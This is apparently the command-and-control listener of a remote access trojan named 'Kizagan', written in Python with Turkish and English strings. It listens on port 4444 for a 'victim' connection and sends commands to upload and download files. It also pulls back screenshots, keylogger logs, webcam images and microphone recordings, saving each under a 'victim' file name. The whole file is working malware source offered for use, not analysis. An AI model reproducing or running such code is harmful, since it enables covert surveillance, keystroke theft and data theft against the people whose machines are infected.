import socket
import colorama
from colorama import Fore,Style,Back
import os
import simplejson
import base64
import datetime
import random
import time

colorama.init(autoreset=True)


class Dinleyici():
    def __init__(self,ip,port):
        yazi1 = """
        
██╗░░██╗██╗███████╗░█████╗░░██████╗░░█████╗░███╗░░██╗
██║░██╔╝██║╚════██║██╔══██╗██╔════╝░██╔══██╗████╗░██║
█████═╝░██║░░███╔═╝███████║██║░░██╗░███████║██╔██╗██║
██╔═██╗░██║██╔══╝░░██╔══██║██║░░╚██╗██╔══██║██║╚████║
██║░╚██╗██║███████╗██║░░██║╚██████╔╝██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        yazi2 = """
__  __     __     ______     ______     ______     ______     __   __    
/\ \/ /    /\ \   /\___  \   /\  __ \   /\  ___\   /\  __ \   /\ "-.\ \   
\ \  _"-.  \ \ \  \/_/  /__  \ \  __ \  \ \ \__ \  \ \  __ \  \ \ \-.  \  
 \ \_\ \_\  \ \_\   /\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\\"\_\ 
  \/_/\/_/   \/_/   \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/ \/_/ 
                                                                          
        """
        yazi3 = """
888    d8P  8888888 8888888888P        d8888  .d8888b.         d8888 888b    888 
888   d8P     888         d88P        d88888 d88P  Y88b       d88888 8888b   888 
888  d8P      888        d88P        d88P888 888    888      d88P888 88888b  888 
888d88K       888       d88P        d88P 888 888            d88P 888 888Y88b 888 
8888888b      888      d88P        d88P  888 888  88888    d88P  888 888 Y88b888 
888  Y88b     888     d88P        d88P   888 888    888   d88P   888 888  Y88888 
888   Y88b    888    d88P        d8888888888 Y88b  d88P  d8888888888 888   Y8888 
888    Y88b 8888888 d8888888888 d88P     888  "Y8888P88 d88P     888 888    Y888 """
        yazi4 = """
  _  _______ ______         _____          _   _ 
 | |/ /_   _|___  /   /\   / ____|   /\   | \ | |
 | ' /  | |    / /   /  \ | |  __   /  \  |  \| |
 |  <   | |   / /   / /\ \| | |_ | / /\ \ | . ` |
 | . \ _| |_ / /__ / ____ \ |__| |/ ____ \| |\  |
 |_|\_\_____/_____/_/    \_\_____/_/    \_\_| \_|                                 
        """
        yazi5 = """
$$\   $$\ $$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ 
$$ | $$  |\_$$  _|\____$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |
$$ |$$  /   $$ |      $$  / $$ /  $$ |$$ /  \__|$$ /  $$ |$$$$\ $$ |
$$$$$  /    $$ |     $$  /  $$$$$$$$ |$$ |$$$$\ $$$$$$$$ |$$ $$\$$ |
$$  $$<     $$ |    $$  /   $$  __$$ |$$ |\_$$ |$$  __$$ |$$ \$$$$ |
$$ |\$$\    $$ |   $$  /    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |
$$ | \$$\ $$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ | \$$ |
\__|  \__|\______|\________|\__|  \__| \______/ \__|  \__|\__|  \__|
                                                                    
                                                                    
                                                                    """
        yazilar = [yazi1,yazi2,yazi3,yazi4,yazi5]
        os.system("clear")
        secim = random.choice(yazilar)
        print(Fore.RED+secim)
        time.sleep(1)
        print(Fore.YELLOW+"\nAvrupa Hunlarının Savaş Tanrısı./God of War of the European Huns.\n")
        time.sleep(1)
        #print(secim)
        print(Fore.GREEN+"\t\t\t\t\t\tAuthor : Yiğit Aydemir")
        print(Fore.GREEN+"\t\t\t\t\t\tInstagram : https://www.instagram.com/arduinocum.py/\n\n\n\n")
        dinleyici = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        dinleyici.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            dinleyici.bind((ip,port))
            dinleyici.listen(0)
        except OSError:
            print(Fore.MAGENTA+"IP and port number is wrong check again./IP ve port numarası yanlış tekrar kontrol edin.")
            exit()
        print(Back.BLACK + Fore.RED+"[+]Gelecek baglantilar dinlenilmeye baslandi./Listening the connections.\n\n")
        (self.connection,adres) = dinleyici.accept()
        print(Fore.GREEN+"[!]Kurban baglantisi geldi/A victim's connection was came. : " + str(adres)+"\n\n")
        time.sleep(2)
        os.system("clear")
        secim = random.choice(yazilar)
        print(Fore.GREEN+secim)
        print(Fore.YELLOW + "\nAvrupa Hunlarının Savaş Tanrısı./God of War of the European Huns.\n")
        print(Fore.BLUE + "\t\t\t\t\t\tAuthor : Yiğit Aydemir")
        print(Fore.GREEN+"\t\t\t\t\t\tInstagram : https://www.instagram.com/arduinocum.py/\n\n\n\n")
        print(Fore.RED+"Komutlar için 'yardim' yaziniz./For commands write 'help'.")

    def jsonGonder(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    def jsonAl(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(100000).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    def komutCalistir(self,komut):
        self.jsonGonder(komut)
        if komut[0] == "exit" or komut[0] == "cik":
            self.connection.close()
            exit()
        return self.jsonAl()


    def save_file(self,yol,icerik):
        with open(yol,"wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            if komut_girisi[0] == "ss" or komut_girisi[0] == "ekran_goruntusu":
                return Fore.MAGENTA+"[+]Ekran goruntusu kaydedildi/The screenshot was saved in current directory."
            elif komut_girisi[0] == "kg_kaydet" or komut_girisi[0] == "kg_save":
                return Fore.MAGENTA+"[+]Keylogger dosyasi kaydedildi/Keylogger file was saved in current directory."
            elif komut_girisi[0] == "kamera_goruntusu_al" or komut_girisi[0] == "get_camera_image":
                return Fore.MAGENTA+"[+]Kurbanin kamera goruntusu kaydedildi/Saved the victim's camera image in current directory."
            else:
                return Fore.MAGENTA+"[+]Dosya indirildi/The file was downloaded."
    def get_file_contents(self,yol):
        with open(yol,"rb") as dosya:
            return base64.b64encode(dosya.read())
    def Clear(self):
        return os.system("clear")

    def Basla(self):
        while True:
            global komut_girisi
            print(Fore.RED+"<<<<<Console/Konsol>>>>>")
            komut_girisi = input(Fore.BLUE+"╰──------>Command/Komut:")
            komut_girisi = komut_girisi.split(" ")

            try:
                if komut_girisi[0] == "upload" or komut_girisi[0] == "yukle":
                    dosya_icerigi = self.get_file_contents(komut_girisi[1])
                    komut_girisi.append(dosya_icerigi)
                komut_cikisi = self.komutCalistir(komut_girisi)

                if komut_girisi[0] == "download" or komut_girisi[0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir/The command could not be applied.The victim's machine might be disconnected." not in komut_girisi:
                    komut_cikisi = self.save_file(komut_girisi[1],komut_cikisi)
                elif komut_girisi[0] == "clear" or komut_girisi[0] == "temizle":
                    komut_cikisi = self.Clear()
                elif komut_girisi[0] == "ss" or komut_girisi[0] == "ekran_goruntusu":
                    tarih = datetime.datetime.now()
                    tarihli_dosya = str(tarih.hour)+":"+str(tarih.minute)+":"+str(tarih.second)+" "
                    komut_cikisi = self.save_file(tarihli_dosya+"victim_ss.png",komut_cikisi)
                elif komut_girisi[0] == "kg_kaydet" or komut_girisi[0] == "kg_save":
                    tarih = datetime.datetime.now()
                    tarihli_dosya = str(tarih.hour) + ":" + str(tarih.minute) + ":" + str(tarih.second)+" "
                    komut_cikisi = self.save_file(tarihli_dosya+"victims_keylog.txt",komut_cikisi)
                elif komut_girisi[0] == "kamera_goruntusu_al" or komut_girisi[0] == "get_camera_image":
                    tarih = datetime.datetime.now()
                    tarihli_dosya = str(tarih.hour) + ":" + str(tarih.minute) + ":" + str(tarih.second) + " "
                    komut_cikisi = self.save_file(tarihli_dosya+"victim_camera.png",komut_cikisi)
                elif komut_girisi[0] == "ses_kayit_indir" or komut_girisi[0] == "download_sound_recording":
                    tarih = datetime.datetime.now()
                    tarihli_dosya = str(tarih.hour) + ":" + str(tarih.minute) + ":" + str(tarih.second) + " "
                    komut_cikisi = self.save_file(tarihli_dosya+"victim_mic_sound.wav",komut_cikisi)
            except Exception:
                print(Back.BLACK+Fore.YELLOW+"Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir/The command could not be applied.The victim's machine might be disconnected.")
            print(komut_cikisi)

try:
    dinleyicim = Dinleyici("192.168.1.105",4444)
    dinleyicim.Basla()
except KeyboardInterrupt:
    print(Fore.GREEN+"[+]Ctrl+C detected.Exiting.../Ctrl+C algılandı.Cikiliyor...")






